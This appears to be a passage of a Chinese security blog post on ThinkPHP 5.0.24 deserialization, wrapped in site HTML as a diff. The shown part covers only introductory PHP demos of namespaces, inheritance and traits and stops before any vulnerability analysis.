@@ -1,0 +1,911 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="拖了好久的tp框架，是时候开始学习了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP5.0.24 反序列化漏洞探索">
+<meta property="og:url" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="拖了好久的tp框架，是时候开始学习了">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240621225741239.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240621230229110.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240618224916921.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708195557785.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240707123532191.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240707123819033.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709232314618.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708165745246.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708170305125.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708175754409.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708180100853.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708180145356.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708180300230.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708181753930.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708182922643.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709105211261.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709110001461.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709111217400.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709112137562.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709135401749.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709140708127.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709135839727.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709140447139.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709143002495.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709143112732.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709143822708.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709144029570.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709145124298.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709164150929.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709170952503.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709171130568.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709172014994.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709172137434.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709173740127.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709182751369.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709182927457.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709194521983.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709225558456.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20221011115008-ccb4a1ce-4917-1.png">
+<meta property="article:published_time" content="2024-07-07T14:46:24.000Z">
+<meta property="article:modified_time" content="2024-07-09T15:51:29.342Z">
+<meta property="article:author" content="rev1ve">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="ThinkPHP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240621225741239.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ThinkPHP5.0.24 反序列化漏洞探索 | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ThinkPHP5.0.24 反序列化漏洞探索
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-07-07 22:46:24" itemprop="dateCreated datePublished" datetime="2024-07-07T22:46:24+08:00">2024-07-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-07-09 23:51:29" itemprop="dateModified" datetime="2024-07-09T23:51:29+08:00">2024-07-09</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">漏洞分析</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html" class="post-meta-item leancloud_visitors" data-flag-title="ThinkPHP5.0.24 反序列化漏洞探索" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>拖了好久的tp框架，是时候开始学习了</p>
+<span id="more"></span>
+
+
+
+<h1 id="ThinkPHP5-0-24-反序列化漏洞探索"><a href="#ThinkPHP5-0-24-反序列化漏洞探索" class="headerlink" title="ThinkPHP5.0.24 反序列化漏洞探索"></a>ThinkPHP5.0.24 反序列化漏洞探索</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于本篇文章是tp框架学习计划的开头，为了方便后续其他tp漏洞学习，内容包括一些前置知识以及tp开发手册。毕竟安全和开发密不可分，打好基础对整个tp框架学习起到非常大的帮助。</p>
+<hr>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="命名空间-子命名空间"><a href="#命名空间-子命名空间" class="headerlink" title="命名空间&amp;子命名空间"></a>命名空间&amp;子命名空间</h3><p>namespace实际上是命名空间，我们可以把namespace理解为一个单独的空间，事实上它也就是一个空间而已，子命名空间那就是空间里再划分几个小空间，我们通过下面demo来具体了解一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">animal</span>\<span class="title class_">cat</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;catcatcat&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">animal</span>\<span class="title class_">dogA</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;A:dogdogdog&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">animal</span>\<span class="title class_">dogB</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;B:dogdogdog&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运用namespace定义了命名空间animal以及三个子空间<code>cat,dogA,dogB</code>，并且编写三个类。我们来看下面几种运用命名空间的方式</p>
+<ol>
+<li><p>如果我们直接进行实例化<code>new dog();</code>，那么输出结果为<code>B:dogdogdog</code>。这是因为如果不选择命名空间的话，就直接是最后的命名空间<code>namespace animal\dogB</code></p>
+</li>
+<li><p>直接对命名空间对应的类实例化，或者先规定命名空间然后直接实例化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//直接实例化</span><br><span class="line">new \animal\dogA\dog();</span><br><span class="line"></span><br><span class="line">//先规定再实例化</span><br><span class="line">use animal\dogA;</span><br><span class="line">new dogA\dog();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>use</code>在这里和include、require有点像，就是在<strong>当前命名空间引入其他命名空间的别名</strong>，比如<code>use animal\dogA as alias</code>其中的alias就是animal的别名，然后我们就可以用这个别名来调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use animal\dogA as alias;</span><br><span class="line">new alias\dog();</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>所以当我们在拉反序列化链子的时候 ，除了<code>namespace</code>当前类的命名空间，还要<code>use</code>下一个类的<code>命名空间 + \类名</code></p>
+<hr>
+<h3 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h3><p>直接来看下面demo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">father</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>=<span class="number">20</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hobby</span>=<span class="string">&quot;game&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i am father \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i like play basketball \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">child</span> <span class="keyword">extends</span> <span class="title">father</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Alice&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i am child \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parentsay</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">say</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$child</span>=<span class="keyword">new</span> <span class="title function_ invoke__">child</span>();</span><br><span class="line"><span class="variable">$child</span>-&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line"><span class="variable">$child</span>-&gt;<span class="title function_ invoke__">smoke</span>();</span><br><span class="line"><span class="variable">$child</span>-&gt;<span class="title function_ invoke__">parentsay</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$child</span>-&gt;hobby;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240621225741239.png"></p>
+<p>我们通过这个demo可以发现。在php中类的继承和java中类似，子类可以继承父类，子类也可以覆写父类的方法。当然子类能利用<code>parent::</code>关键字访问父类被覆盖的方法</p>
+<h3 id="trait修饰符"><a href="#trait修饰符" class="headerlink" title="trait修饰符"></a>trait修饰符</h3><p>使得被修饰的类可以进行复用，增加了代码的可复用性，使用这个修饰符就可以在一个类包含另一个类</p>
+<p>demo如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;test\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rev1ve</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;rev1ve\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title function_ invoke__">rev1ve</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240621230229110.png"></p>
+<p>test是一个用trait修饰的类，所以我们只要在rev1ve类中use了test这个类，我们就可以调用其中的方法，类似于类的继承</p>
+<p>我们看下面有趣的demo</p>
+<p>test.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace first\test;</span><br><span class="line">use second\test1\test1;</span><br><span class="line">class test&#123;</span><br><span class="line">    use test1;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        echo &quot;test\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>test1.php</p>
